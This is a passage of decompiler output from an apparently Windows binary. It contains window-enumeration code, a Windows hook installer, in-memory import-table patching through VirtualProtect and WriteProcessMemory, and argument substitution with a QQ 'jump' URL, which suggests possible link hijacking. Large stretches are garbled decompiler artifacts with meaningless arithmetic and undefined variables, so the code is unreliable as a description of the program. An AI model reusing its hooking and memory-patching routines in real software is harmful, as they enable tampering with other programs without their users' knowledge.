                            // 0x406fc4
                            *(int32_t *)(a1 + 20) = nIndex;
                            v3 = v12;
                        }
                    } else {
                        // 0x406f7a
                        function_4070ea();
                        function_4035c2();
                        function_403762();
                        v3 = v9;
                    }
                }
            }
        }
    }
    // 0x406fc9
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x406feb;
    return function_4034e2();
}

// Address range: 0x406fe4 - 0x406fe9
int32_t function_406fe4(void) {
    // 0x406fe4
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406fe9 - 0x406feb
int32_t function_406fe9(void) {
    // 0x406fe9
    int32_t result; // 0x406fe9
    return result;
}

// Address range: 0x406feb - 0x406ff6
int32_t function_406feb(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406feb
    int32_t result; // 0x406feb
    return result;
}

// Address range: 0x406ff6 - 0x40707b
int32_t function_406ff6(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x406ff6
    int32_t hWnd; // 0x406ff6
    int32_t lpdwProcessId; // 0x406ff6
    GetWindowThreadProcessId((int32_t *)hWnd, (int32_t *)lpdwProcessId);
    int32_t v1 = function_40456a(); // 0x407033
    int32_t v2; // bp-60, 0x406ff6
    int32_t v3 = &v2; // 0x407038
    int32_t v4; // bp-40, 0x406ff6
    *(int32_t *)(v3 - 4) = (int32_t)&v4;
    *(int32_t *)(v3 - 8) = 0x406f12;
    EnumWindows((bool (*)(int32_t *, int32_t))&g117, (int32_t)&g117);
    *(int32_t *)(v3 - 12) = 1;
    Sleep((int32_t)&g117);
    v3 -= 16;
    *(int32_t *)v3 = 0;
    while (!IsWindow(&g117)) {
        // 0x407059
        if (function_40456a() - v1 > a2) {
            // break -> 0x407064
            break;
        }
        *(int32_t *)(v3 - 4) = (int32_t)&v4;
        *(int32_t *)(v3 - 8) = 0x406f12;
        EnumWindows((bool (*)(int32_t *, int32_t))&g117, (int32_t)&g117);
        *(int32_t *)(v3 - 12) = 1;
        Sleep((int32_t)&g117);
        v3 -= 16;
        *(int32_t *)v3 = 0;
    }
    // 0x407064
    return 0;
}

// Address range: 0x40707e - 0x407095
int32_t function_40707e(void) {
    // 0x40707e
    int32_t v1; // 0x40707e
    return (unsigned char)((char)v1 - 33) < 94;
}

// Address range: 0x407096 - 0x4070ad
int32_t function_407096(int32_t a1) {
    int32_t v1 = -1; // 0x4070a1
    int32_t v2 = 0; // 0x4070a1
    while (v1 != 0) {
        int32_t v3; // 0x407096
        int32_t v4 = v3;
        v1--;
        bool v5; // 0x407096
        v3 = v4 + (v5 ? -1 : 1);
        v2 = v1;
        if (*(char *)v4 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    return -2 - v2;
}

// Address range: 0x4070ae - 0x4070c0
int32_t function_4070ae(void) {
    // 0x4070ae
    return function_4035c2();
}

// Address range: 0x4070c2 - 0x4070ea
int32_t function_4070c2(void) {
    int32_t v1 = -1; // 0x4070cf
    int32_t v2 = 0; // 0x4070cf
    bool v3; // 0x4070c2
    while (v1 != 0) {
        int32_t v4; // 0x4070c2
        int32_t v5 = v4;
        v1--;
        v4 = v5 + (v3 ? -1 : 1);
        v2 = v1;
        if (*(char *)v5 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    uint32_t v6 = v2 ^ -1; // 0x4070d1
    uint32_t v7 = v6 / 4; // 0x4070db
    int32_t v8; // 0x4070c2
    int32_t result; // 0x4070c2
    __asm_rep_movsd_memcpy((char *)result, (char *)v8, v7);
    char * v9 = (char *)(v7 * (v3 ? -4 : 4) + result); // 0x4070e5
    __asm_rep_movsb_memcpy(v9, v9, v6 & 3);
    return result;
}

// Address range: 0x4070ea - 0x40711d
int32_t function_4070ea(void) {
    // 0x4070ea
    int32_t hWnd; // 0x4070ea
    int32_t v1 = SendMessageA((int32_t *)hWnd, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x4070fe
    int32_t v2; // bp-284, 0x4070ea
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4035fe();
}

// Address range: 0x40711e - 0x407155
int32_t function_40711e(void) {
    // 0x40711e
    int32_t lpClassName; // 0x40711e
    int32_t hWnd; // 0x40711e
    int32_t v1 = GetClassNameA((int32_t *)hWnd, (char *)lpClassName, (int32_t)&g117); // 0x407135
    int32_t v2; // bp-284, 0x40711e
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4035fe();
}

// Address range: 0x407156 - 0x407195
int32_t function_407156(void) {
    // 0x407156
    function_403616();
    function_403616();
    return function_403876(&g117);
}

// Address range: 0x407196 - 0x4071ce
int32_t function_407196(void) {
    // 0x407196
    function_403616();
    int32_t v1; // 0x407196
    return function_403876((int32_t *)v1);
}

// Address range: 0x4071ce - 0x4071fd
int32_t function_4071ce(void) {
    // 0x4071ce
    function_403816();
    int32_t Locale = function_403816(); // 0x4071e2
    int32_t v1 = CompareStringA(Locale, 1, (char *)1024, (int32_t)&g117, (char *)&g117, (int32_t)&g117); // 0x4071ef
    return v1 & -256 | (int32_t)(v1 == 2);
}

// Address range: 0x4071fe - 0x407278
int32_t function_4071fe(void) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x407210
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-36, 0x4071fe
    int32_t v3 = &v2; // 0x407218
    int32_t hWnd; // 0x4071fe
    int32_t v4 = (int32_t)GetTopWindow((int32_t *)hWnd);
    int32_t * v5 = (int32_t *)(v3 - 4); // 0x407258
    *v5 = v4;
    bool v6 = IsWindow(&g117); // 0x407259
    int32_t v7 = v3; // 0x407260
    int32_t * v8 = v5; // 0x407260
    if (v6) {
        function_4070ea();
        function_4071fe();
        *(int32_t *)(v3 - 8) = 2;
        int32_t v9 = v3 - 12; // 0x407250
        *(int32_t *)v9 = v4;
        int32_t v10 = (int32_t)GetWindow(&g117, (int32_t)&g117);
        int32_t * v11 = (int32_t *)(v3 - 16);
        *v11 = v10;
        bool v12 = IsWindow(&g117); // 0x407259
        v7 = v9;
        v8 = v11;
        while (v12) {
            int32_t v13 = v9;
            function_4070ea();
            function_4071fe();
            *(int32_t *)(v13 - 8) = 2;
            v9 = v13 - 12;
            *(int32_t *)v9 = v10;
            v10 = (int32_t)GetWindow(&g117, (int32_t)&g117);
            v11 = (int32_t *)(v13 - 16);
            *v11 = v10;
            v12 = IsWindow(&g117);
            v7 = v9;
            v8 = v11;
        }
    }
    // 0x407262
    __writefsdword(0, *v8);
    *(int32_t *)(v7 + 4) = 0x40727f;
    return function_4034be();
}

// Address range: 0x407278 - 0x40727d
int32_t function_407278(void) {
    // 0x407278
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40727d - 0x40727f
int32_t function_40727d(void) {
    // 0x40727d
    int32_t result; // 0x40727d
    return result;
}

// Address range: 0x40727f - 0x407287
int32_t function_40727f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40727f
    int32_t result; // 0x40727f
    return result;
}

// Address range: 0x40728a - 0x4072eb
int32_t function_40728a(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x40729b
    __writefsdword(0, (int32_t)&v1);
    function_40711e();
    function_403762();
    function_4071fe();
    __writefsdword(0, v1);
    return function_4034be();
}

// Address range: 0x4072eb - 0x4072f0
int32_t function_4072eb(void) {
    // 0x4072eb
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4072f0 - 0x4072f2
int32_t function_4072f0(void) {
    // 0x4072f0
    int32_t result; // 0x4072f0
    return result;
}

// Address range: 0x4072f2 - 0x4072f9
int32_t function_4072f2(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4072f2
    int32_t result; // 0x4072f2
    return result;
}

// Address range: 0x40730d - 0x407315
int32_t function_40730d(void) {
    // 0x40730d
    int32_t v1; // 0x40730d
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x40730d
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3; // 0x40730d
    char * v4 = (char *)(v3 + 81); // 0x407311
    int32_t v5; // 0x40730d
    *v4 = *v4 + (char)v5;
    return result;
}

// Address range: 0x407315 - 0x407319
float80_t function_407315(void) {
    // 0x407315
    float80_t v1; // 0x407315
    return 2 * v1;
}

// Address range: 0x40731a - 0x407399
int32_t function_40731a(void) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x40732a
    __writefsdword(0, (int32_t)&v1);
    function_40711e();
    function_403762();
    int32_t nIndex; // 0x40731a
    int32_t v2 = GetWindowLongA((int32_t *)-12, nIndex); // 0x40734c
    int32_t v3; // bp-32, 0x40731a
    int32_t * v4 = &v3; // 0x407356
    if (v2 != 180) {
        int32_t v5 = GetWindowLongA((int32_t *)-16, nIndex); // 0x40735b
        int32_t v6; // bp-40, 0x40731a
        v4 = &v6;
        if ((v5 & 32) == 0) {
            // 0x407364
            SendMessageA(NULL, 0, 210, nIndex);
            int32_t v7; // bp-56, 0x40731a
            v4 = &v7;
        }
    }
    // 0x40737d
    __writefsdword(0, *v4);
    *(int32_t *)((int32_t)v4 + 8) = 0x4073a0;
    return function_4034be();
}

// Address range: 0x407399 - 0x40739e
int32_t function_407399(void) {
    // 0x407399
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40739e - 0x4073a0
int32_t function_40739e(void) {
    // 0x40739e
    int32_t result; // 0x40739e
    return result;
}

// Address range: 0x4073a0 - 0x4073a6
int32_t function_4073a0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4073a0
    int32_t result; // 0x4073a0
    return result;
}

// Address range: 0x4073b6 - 0x407410
int32_t function_4073b6(void) {
    // 0x4073b6
    int32_t hWnd; // 0x4073b6
    int32_t * h = GetDC((int32_t *)hWnd); // 0x4073be
    int32_t lParam; // 0x4073b6
    SelectObject((int32_t *)SendMessageA(NULL, 0, 49, lParam), h);
    int32_t hdc; // bp-40, 0x4073b6
    GetCharWidthA(&hdc, 42, 42, h);
    SelectObject(GetStockObject(10), h);
    ReleaseDC(h, (int32_t *)lParam);
    int32_t lpPoint; // bp-84, 0x4073b6
    GetCaretPos((struct tagPOINT *)&lpPoint);
    int32_t v1 = &lpPoint; // 0x407402
    return (0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) / (int64_t)(int32_t)h;
}

// Address range: 0x407412 - 0x40751f
int32_t function_407412(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x407426
    int32_t v2 = &v1; // 0x407426
    __writefsdword(0, v2);
    if (g37 != 0) {
        // 0x40743b
        *(int32_t *)g37 = 0;
    }
    // 0x40744e
    int32_t v3; // 0x407412
    int32_t v4; // 0x407412
    if (g34 == 0) {
        // 0x407462
        function_407546();
        v4 = v2;
        goto lab_0x407509;
    } else {
        // 0x407458
        if (g35 != 0) {
            // 0x40746c
            v3 = g35;
            if (*(char *)&g38 == 0) {
                goto lab_0x407495;
            } else {
                // 0x407476
                if (function_406d2e() == 0) {
                    // 0x407476
                    v3 = g35;
                    goto lab_0x407495;
                } else {
                    // 0x40748e
                    function_407546();
                    v4 = v2;
                    goto lab_0x407509;
                }
            }
        } else {
            // 0x407462
            function_407546();
            v4 = v2;
            goto lab_0x407509;
        }
    }
  lab_0x407509:
    // 0x407509
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x407526;
    return function_4034be();
  lab_0x407495:
    // 0x407495
    function_4036d6(v3);
    function_403512();
    int32_t lpThreadAttributes; // bp-12, 0x407412
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))3, (int32_t *)0x406496, 0, NULL);
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))1, (int32_t *)0x406496, 0, NULL);
    int32_t v5 = 0; // bp-112, 0x4074fd
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, NULL, (int32_t *)0x406496, 0, NULL);
    function_407546();
    v4 = &v5;
    goto lab_0x407509;
}

// Address range: 0x40751f - 0x407524
int32_t function_40751f(void) {
    // 0x40751f
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x407524 - 0x407526
int32_t function_407524(void) {
    // 0x407524
    int32_t result; // 0x407524
    return result;
}

// Address range: 0x407526 - 0x40752d
int32_t function_407526(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x407526
    int32_t result; // 0x407526
    return result;
}

// Address range: 0x407546 - 0x40755b
int32_t function_407546(void) {
    // 0x407546
    function_4034be();
    return function_4034be();
}

// Address range: 0x40755e - 0x4075c7
int32_t function_40755e(void) {
    int32_t v1 = 257; // bp-488, 0x40756f
    int32_t v2; // 0x40755e
    int32_t v3; // 0x40755e
    WSAStartup((int16_t)v3, (struct WSAData *)v2);
    function_4034be();
    int32_t namelen = &v1; // 0x407586
    int32_t name = namelen; // bp-496, 0x407586
    gethostname((char *)64, namelen);
    char * v4 = (char *)&name; // bp-500, 0x40758c
    struct hostent * v5 = gethostbyname((char *)&name); // 0x40758d
    int32_t result = (int32_t)v5; // 0x40758d
    if (v5 == NULL) {
        // 0x4075bc
        return result;
    }
    int32_t v6 = *(int32_t *)(result + 12); // 0x407596
    int32_t v7 = *(int32_t *)v6; // 0x4075b0
    if (v7 != 0) {
        int32_t v8 = 0; // 0x4075af
        int32_t v9 = (int32_t)&v4;
        int32_t v10 = v9; // 0x40759f
        if (v8 == 0) {
            // 0x4075a1
            v10 = v9 - 4;
            *(int32_t *)v10 = *(int32_t *)v7;
            inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g117});
            function_4070ae();
        }
        // 0x4075af
        v8++;
        int32_t v11 = *(int32_t *)(4 * v8 + v6); // 0x4075b0
        while (v11 != 0) {
            // 0x40759d
            v9 = v10;
            v10 = v9;
            if (v8 == 0) {
                // 0x4075a1
                v10 = v9 - 4;
                *(int32_t *)v10 = *(int32_t *)v11;
                inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g117});
                function_4070ae();
            }
            // 0x4075af
            v8++;
            v11 = *(int32_t *)(4 * v8 + v6);
        }
    }
    // 0x4075bc
    return WSACleanup();
}

// Address range: 0x4075ca - 0x4075ef
int32_t function_4075ca(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4075d5
    __writefsdword(0, (int32_t)&v1);
    g110++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4075ef - 0x4075f4
int32_t function_4075ef(void) {
    // 0x4075ef
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4075f4 - 0x4075f6
int32_t function_4075f4(void) {
    // 0x4075f4
    int32_t result; // 0x4075f4
    return result;
}

// Address range: 0x4075f6 - 0x4075f8
int32_t function_4075f6(int32_t a1) {
    // 0x4075f6
    int32_t result; // 0x4075f6
    return result;
}

// Address range: 0x4075fa - 0x407602
int32_t function_4075fa(void) {
    // 0x4075fa
    g110--;
    int32_t result; // 0x4075fa
    return result;
}

// Address range: 0x407602 - 0x407620
int32_t function_407602(int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x407602
    int32_t hhk; // 0x407602
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, lParam);
}

// Address range: 0x407622 - 0x40764b
int32_t JmpHookOn(void) {
    int32_t * v1 = SetWindowsHookExA(0, g81, (int32_t *)0x407602, 3); // 0x407632
    g112 = (int32_t)v1;
    return v1 != NULL;
}

// Address range: 0x40764e - 0x40765a
int32_t JmpHookOff(void) {
    // 0x40764e
    return UnhookWindowsHookEx((int32_t *)g112);
}

// Address range: 0x40765a - 0x40767f
int32_t function_40765a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407665
    __writefsdword(0, (int32_t)&v1);
    g111++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40767f - 0x407684
int32_t function_40767f(void) {
    // 0x40767f
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x407684 - 0x407686
int32_t function_407684(void) {
    // 0x407684
    int32_t result; // 0x407684
    return result;
}

// Address range: 0x407686 - 0x407688
int32_t function_407686(int32_t a1) {
    // 0x407686
    int32_t result; // 0x407686
    return result;
}

// Address range: 0x40768a - 0x407692
int32_t function_40768a(void) {
    // 0x40768a
    g111--;
    int32_t result; // 0x40768a
    return result;
}

// Address range: 0x407692 - 0x407698
int32_t * function_407692(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size) {
    // 0x407692
    return ImageDirectoryEntryToData(Base, MappedAsImage, DirectoryEntry, Size);
}

// Address range: 0x40769a - 0x4076bf
int32_t function_40769a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4076a5
    __writefsdword(0, (int32_t)&v1);
    g113++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4076bf - 0x4076c4
int32_t function_4076bf(void) {
    // 0x4076bf
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4076c4 - 0x4076c6
int32_t function_4076c4(void) {
    // 0x4076c4
    int32_t result; // 0x4076c4
    return result;
}

// Address range: 0x4076c6 - 0x4076c8
int32_t function_4076c6(int32_t a1) {
    // 0x4076c6
    int32_t result; // 0x4076c6
    return result;
}

// Address range: 0x4076ca - 0x4076d2
int32_t function_4076ca(void) {
    // 0x4076ca
    g113--;
    int32_t result; // 0x4076ca
    return result;
}

// Address range: 0x4076d2 - 0x4077b6
int32_t function_4076d2(int32_t a1, int32_t a2) {
    // 0x4076d2
    uint16_t v1; // 0x4076d2
    char * v2 = (char *)(int32_t)v1; // bp-2, 0x4076d2
    int32_t v3; // 0x4076d2
    int32_t result2; // 0x4076d2
    int32_t v4; // 0x4076d2
    int32_t result; // 0x4076d2
    int32_t v5; // 0x4076d2
    int32_t v6; // 0x4076d2
    int32_t v7; // 0x4076d2
    int32_t v8; // 0x4076d2
    bool v9; // 0x4076d2
    bool v10; // 0x4076d2
    if (v9 || v10) {
        int32_t v11 = result;
        *(char *)v11 = *(char *)&result + (char)v11;
        int32_t v12 = result;
        *(char *)v12 = *(char *)&result + (char)v12;
        int32_t v13 = result;
        *(char *)v13 = *(char *)&result + (char)v13;
        int32_t v14 = result;
        *(char *)v14 = *(char *)&result + (char)v14;
        int32_t v15 = result;
        *(char *)v15 = *(char *)&result + (char)v15;
        int32_t v16 = result;
        *(char *)v16 = *(char *)&result + (char)v16;
        int32_t v17 = result;
        *(char *)v17 = *(char *)&result + (char)v17;
        int32_t v18 = result;
        *(char *)v18 = *(char *)&result + (char)v18;
        int32_t v19 = result;
        *(char *)v19 = *(char *)&result + (char)v19;
        int32_t v20 = result;
        *(char *)v20 = *(char *)&result + (char)v20;
        int32_t v21 = result;
        *(char *)v21 = *(char *)&result + (char)v21;
        int32_t v22 = result;
        *(char *)v22 = *(char *)&result + (char)v22;
        int32_t v23 = result;
        *(char *)v23 = *(char *)&result + (char)v23;
        int32_t v24 = result;
        *(char *)v24 = *(char *)&result + (char)v24;
        unsigned char v25 = *(char *)&v5; // 0x4076f1
        int32_t v26; // 0x4076d2
        char v27 = v26; // 0x4076f1
        unsigned char v28 = v25 + v27; // 0x4076f1
        *(char *)v5 = v28;
        if (v28 < v25 || v28 == 0) {
            char * v29 = (char *)(2 * result); // 0x4076f5
            *v29 = *v29 + v27;
            unsigned char v30 = *(char *)&result; // 0x4076f8
            unsigned char v31 = v30 + (char)result; // 0x4076f8
            *(char *)result = v31;
            int32_t v32 = result;
            *(int32_t *)v32 = 2 * v32 | (int32_t)(v31 < v30);
            char v33 = v8; // 0x407701
            *(char *)v5 = *(char *)&v5 + v33;
            *(char *)v5 = *(char *)&v5 + (char)(int32_t)v2;
            int16_t v34; // 0x4076d2
            *v2 = *(char *)&v34 + v33;
            *(char *)v5 = *(char *)&v5 + (char)result;
            return result;
        }
        // 0x4076d5
        v6 = (int32_t)&v2;
        goto lab_0x407735;
    } else {
        // 0x407715
        int32_t v35; // 0x4076d2
        char v36 = v35;
        *(char *)v35 = (char)(result / 256) + v36;
        int32_t v37 = v35 & -0xff01 | 0x7700; // 0x40771a
        *(char *)1 = *(char *)1 + (char)v8;
        int16_t v38 = v37; // 0x407721
        __asm_outsd(v38, v5);
        __asm_outsd(v38, v5);
        int32_t v39 = 73 * *(int32_t *)(v8 + 80); // 0x407723
        result = v39;
        int32_t v40; // bp-26, 0x4076d2
        int32_t v41 = &v40; // 0x407730
        v3 = v37;
        v6 = v41;
        result2 = v39;
        v4 = v37;
        v7 = v41;
        if (v36 == 0) {
            goto lab_0x40773d;
        } else {
            goto lab_0x407735;
        }
    }
  lab_0x407735:;
    int32_t v42 = function_402c3e(); // 0x407738
    result = v42;
    result2 = v42;
    v4 = v3;
    v7 = v6 - 16;
    goto lab_0x40773d;
  lab_0x40773d:;
    int32_t * moduleHandle = GetModuleHandleA((char *)(v4 & 255)); // 0x40774b
    int32_t * v43 = (int32_t *)(result2 + 8); // 0x407750
    *v43 = (int32_t)moduleHandle;
    int32_t v44 = v7 - 4; // 0x407757
    if (moduleHandle != NULL) {
        // 0x407759
        *(int32_t *)(result2 + 12) = a1;
        int32_t * v45 = (int32_t *)(result2 + 16); // 0x40775f
        *v45 = a2;
        int32_t * v46 = (int32_t *)(result2 + 20); // 0x407765
        *v46 = 0x10000 * (int32_t)v2 / 0x10000;
        *(int32_t *)(v7 - 8) = *v45;
        *(int32_t *)(v7 - 12) = a1;
        int32_t * moduleHandle2 = GetModuleHandleA((char *)&g117); // 0x40776d
        int32_t v47 = v7 - 16; // 0x407772
        *(int32_t *)v47 = (int32_t)moduleHandle2;
        int32_t (*func)() = GetProcAddress(&g117, (char *)&g117); // 0x407773
        int32_t v48 = (int32_t)func; // 0x407773
        v5 = v48;
        *(int32_t *)(result2 + 24) = v48;
        v44 = v47;
        if (func != NULL) {
            // 0x407781
            *(int32_t *)(v7 - 20) = *v46;
            int32_t v49 = v7 - 24; // 0x407788
            *(int32_t *)v49 = *v43;
            function_4077fe((int32_t)&g117);
            v44 = v49;
        }
    }
    if ((char)v4 != 0) {
        // 0x40779d
        function_402c96();
        __writefsdword(0, *(int32_t *)v44);
    }
    // 0x4077ac
    return result2;
}

// Address range: 0x4077b6 - 0x4077fe
int32_t function_4077b6(void) {
    int32_t v1 = function_402ca6(); // 0x4077b8
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4077c1
    int32_t v3 = v1; // 0x4077c5
    if (*v2 != 0) {
        int32_t * v4 = (int32_t *)(v1 + 24); // 0x4077c7
        v3 = v1;
        if (*v4 != 0) {
            int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)*(int32_t *)(v1 + 4)); // 0x4077d1
            v3 = moduleHandle;
            if (*v2 == moduleHandle) {
                // 0x4077db
                v3 = function_4077fe(*v4);
            }
        }
    }
    int32_t result = v3; // 0x4077f2
    int32_t v5; // 0x4077b6
    if ((char)v5 >= 1) {
        // 0x4077f4
        result = function_402c8e();
    }
    // 0x4077fb
    return result;
}

// Address range: 0x4077fe - 0x4078b4
int32_t function_4077fe(int32_t a1) {
    // 0x4077fe
    int32_t result; // 0x4077fe
    if (a1 == 0 || a1 <= -1) {
        // 0x4078ab
        return result;
    }
    int32_t v1 = a1; // bp-52, 0x40782f
    int32_t v2; // 0x4077fe
    int32_t v3; // 0x4077fe
    int32_t v4; // 0x4077fe
    int32_t * v5 = ImageDirectoryEntryToData((int32_t *)v2, (char)v3, (int16_t)v4, &g117); // 0x407830
    int32_t result2 = (int32_t)v5; // 0x407830
    if (v5 == NULL) {
        // 0x4078ab
        return result2;
    }
    int32_t result3 = *(int32_t *)(result2 + 12); // 0x4078a4
    if (result3 == 0) {
        // 0x4078ab
        return result3;
    }
    // 0x40783d
    int32_t v6; // bp-24, 0x4077fe
    int32_t v7 = &v6;
    int32_t v8 = result3; // 0x4078a4
    int32_t v9 = result2; // 0x4077fe
    int32_t v10 = &v1; // 0x4077fe
    while (true) {
        int32_t v11 = v10;
        int32_t v12 = v9;
        *(int32_t *)(v11 - 4) = 0x1000000 * v3 / 0x1000000;
        int32_t v13 = v11 - 8; // 0x407846
        *(int32_t *)v13 = v8 + a1;
        int32_t v14 = lstrcmpiA((char *)&g117, (char *)&g117); // 0x407847
        v10 = v13;
        if (v14 == 0) {
            int32_t v15 = *(int32_t *)(v12 + 16) + a1; // 0x407853
            int32_t v16 = *(int32_t *)v15; // 0x40789b
            int32_t v17 = v16; // 0x40789f
            int32_t v18 = v15; // 0x40789f
            v10 = v13;
            if (v16 != 0) {
                int32_t v19 = v18;
                while (v17 != 0x10000 * v4 / 0x10000) {
                    int32_t v20 = v19 + 4; // 0x407898
                    int32_t v21 = *(int32_t *)v20; // 0x40789b
                    v17 = v21;
                    v18 = v20;
                    v10 = v13;
                    if (v21 == 0) {
                        goto lab_0x4078a1;
                    }
                    v19 = v18;
                }
                // 0x40785d
                int32_t v22; // bp-20, 0x4077fe
                *(int32_t *)(v11 - 12) = (int32_t)&v22;
                *(int32_t *)(v11 - 16) = 128;
                *(int32_t *)(v11 - 20) = 4;
                *(int32_t *)(v11 - 24) = v19;
                VirtualProtect(&g117, (int32_t)&g117, (int32_t)&g117, &g117);
                *(int32_t *)(v11 - 28) = v7;
                *(int32_t *)(v11 - 32) = 4;
                int32_t v23; // 0x4077fe
                *(int32_t *)(v11 - 36) = (int32_t)&v23;
                *(int32_t *)(v11 - 40) = v19;
                *(int32_t *)(v11 - 44) = (int32_t)GetCurrentProcess();
                WriteProcessMemory(&g117, &g117, &g117, (int32_t)&g117, &g117);
                *(int32_t *)(v11 - 48) = v7;
                *(int32_t *)(v11 - 52) = v22;
                *(int32_t *)(v11 - 56) = 4;
                int32_t v24 = v11 - 60; // 0x407890
                *(int32_t *)v24 = v19;
                VirtualProtect(&g117, (int32_t)&g117, (int32_t)&g117, &g117);
                v10 = v24;
            }
        }
      lab_0x4078a1:
        // 0x4078a1
        v8 = *(int32_t *)(v12 + 32);
        v9 = v12 + 20;
        result = v8;
        if (v8 == 0) {
            // break -> 0x4078ab
            break;
        }
    }
    // 0x4078ab
    return result;
}

// Address range: 0x4078b6 - 0x4078ba
int32_t function_4078b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4078b6
    int32_t v1; // 0x4078b6
    return *(int32_t *)(v1 + 24);
}

// Address range: 0x4078ba - 0x4078df
int32_t function_4078ba(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4078c5
    __writefsdword(0, (int32_t)&v1);
    g114++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4078df - 0x4078e4
int32_t function_4078df(void) {
    // 0x4078df
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4078e4 - 0x4078e6
int32_t function_4078e4(void) {
    // 0x4078e4
    int32_t result; // 0x4078e4
    return result;
}

// Address range: 0x4078e6 - 0x4078e8
int32_t function_4078e6(int32_t a1) {
    // 0x4078e6
    int32_t result; // 0x4078e6
    return result;
}

// Address range: 0x4078ea - 0x4078f2
int32_t function_4078ea(void) {
    // 0x4078ea
    g114--;
    int32_t result; // 0x4078ea
    return result;
}

// Address range: 0x4078f2 - 0x40793e
int32_t function_4078f2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4078f2
    int32_t v1; // 0x4078f2
    int32_t v2; // 0x4078f2
    int32_t v3; // 0x4078f2
    return function_4078b6(v2, v3, v1, a1, a2);
}

// Address range: 0x40793e - 0x40796d
int32_t function_40793e(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40793e
    int32_t v1; // 0x40793e
    return function_4078b6(v1, a1, a2, a3 != 2975 ? a3 : 2974, a4);
}

// Address range: 0x40796e - 0x407a06
int32_t function_40796e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x407985
    __writefsdword(0, (int32_t)&v1);
    function_4035c2();
    int32_t v2 = function_40395a() < 1 ? a4 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_4035c2();
    int32_t v3 = function_40395a() < 1 ? a3 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_4078b6(a1, a2, v3, v2, a5);
    __writefsdword(0, a6);
    return function_4034e2();
}

// Address range: 0x407a06 - 0x407a0b
int32_t function_407a06(void) {
    // 0x407a06
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x407a0b - 0x407a0d
int32_t function_407a0b(void) {
    // 0x407a0b
    int32_t result; // 0x407a0b
    return result;
}

// Address range: 0x407a0d - 0x407a17
int32_t function_407a0d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407a0d
    int32_t result; // 0x407a0d
    return result;
}

// Address range: 0x407a1d - 0x407a1f
int32_t function_407a1d(void) {
    // 0x407a1d
    int32_t result; // 0x407a1d
    return result;
}

// Address range: 0x407a1f - 0x407b94
int32_t function_407a1f(int32_t result2, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14) {
    int32_t v1 = a14;
    int32_t result; // 0x407a1f
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    char * v3 = (char *)(result + 116); // 0x407a21
    uint32_t v4; // 0x407a1f
    uint32_t v5 = v4 / 256; // 0x407a21
    unsigned char v6 = (char)v5; // 0x407a21
    char v7 = *v3 + v6; // 0x407a21
    *v3 = v7;
    int32_t v8; // 0x407a1f
    int32_t v9; // 0x407a1f
    uint32_t v10; // 0x407a1f
    uint32_t v11; // 0x407a1f
    if (v7 == 0) {
